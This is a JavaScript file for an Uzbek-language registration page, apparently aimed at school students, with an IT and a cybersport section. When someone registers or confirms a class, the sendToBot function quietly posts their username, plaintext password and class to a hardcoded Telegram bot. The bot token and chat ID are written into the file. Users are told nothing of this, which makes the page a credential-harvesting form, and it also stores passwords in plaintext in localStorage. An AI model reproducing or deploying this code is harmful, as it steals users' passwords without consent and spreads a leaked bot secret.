// Telegram Bot sozlamalari
const BOT_TOKEN = "8326245075:AAGaTnieB640tbfgv8s_0t0uXKUtRQ8dUjk";
const CHAT_ID = "8074394669";

let users = JSON.parse(localStorage.getItem('users')||'{}');
let currentAction = 'login';
let currentUser = null;

function openModal(action){
  currentAction = action;
  document.getElementById('modal-bg').style.display = 'flex';
  document.getElementById('modal-title').innerText = action==='login'?'Kirish':'Ro‘yxatdan o‘tish';
  document.getElementById('modal-msg').innerText = '';
  document.getElementById('username').value = '';
  document.getElementById('password').value = '';
}

function submitForm(){
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  const msg = document.getElementById('modal-msg');

  if(username===''||password===''){
    msg.style.color='#f55';
    msg.innerText='Iltimos, barcha maydonlarni to‘ldiring!';
    return;
  }

  if(currentAction==='register'){
    if(users[username]){
      msg.style.color='#f55';
      msg.innerText='Foydalanuvchi allaqachon mavjud!';
    } else {
      users[username]=password;
      localStorage.setItem('users', JSON.stringify(users));
      currentUser=username;
      showWelcome(username);
      sendToBot(username,password);
      msg.style.color='lime';
      msg.innerText='Ro‘yxatdan o‘tish muvaffaqiyatli!';
      setTimeout(()=>document.getElementById('modal-bg').style.display='none',500);
    }
  } else {
    if(users[username] && users[username]===password){
      currentUser=username;
      showWelcome(username);
      document.getElementById('modal-bg').style.display='none';
    } else {
      msg.style.color='#f55';
      msg.innerText='Ism yoki parol xato!';
    }
  }
}

function showWelcome(username){
  document.getElementById('menu').style.display='none';
  const welcome=document.getElementById('welcome-msg');
  const confirmBtn=document.getElementById('confirm-class-btn');
  welcome.style.display='block';
  
  const userClass = localStorage.getItem('userClass_'+username);
  if(userClass){
    welcome.innerText='Xush kelibsiz, '+username+' ('+userClass+')';
    confirmBtn.style.display='none';
  } else {
    welcome.innerText='Xush kelibsiz, '+username;
    confirmBtn.style.display='inline-block';
  }
}

function confirmClass(){
  if(!currentUser) return;
  const className = prompt("Sinfingizni kiriting (masalan: 10A):");
  if(className && className.trim()!==''){
    localStorage.setItem('userClass_'+currentUser,className.trim());
    showWelcome(currentUser);
    alert('Sinf tasdiqlandi: '+className);
    sendToBot(currentUser, users[currentUser], className.trim());
  }
}

function sendToBot(username,password,userClass=null){
  let text = `Yangi foydalanuvchi ro‘yxatdan o‘tdi:\nIsm: ${username}\nParol: ${password}`;
  if(userClass) text += `\nSinf: ${userClass}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({chat_id: CHAT_ID, text:text})
  })
  .then(res=>console.log('Botga yuborildi'))
  .catch(err=>console.log(err));
}

function selectSection(section){
  const itCard=document.getElementById('it-card');
  const cyberCard=document.getElementById('cyber-card');

  if(section==='it'){
    itCard.style.opacity='1';
    cyberCard.style.opacity='0.5';
    cyberCard.style.pointerEvents='none';
    alert('IT bo‘limiga o‘tildi');
  } else {
    cyberCard.style.opacity='1';
    itCard.style.opacity='0.5';
    itCard.style.pointerEvents='none';
    alert('Cybersport bo‘limiga o‘tildi');
  }
}

document.getElementById('modal-bg').addEventListener('click', function(e){
  if(e.target===this){ this.style.display='none'; }
});

const savedUsers = Object.keys(users);
if(savedUsers.length>0){
  const lastUser = savedUsers[savedUsers.length-1];
  currentUser=lastUser;
  showWelcome(lastUser);
}
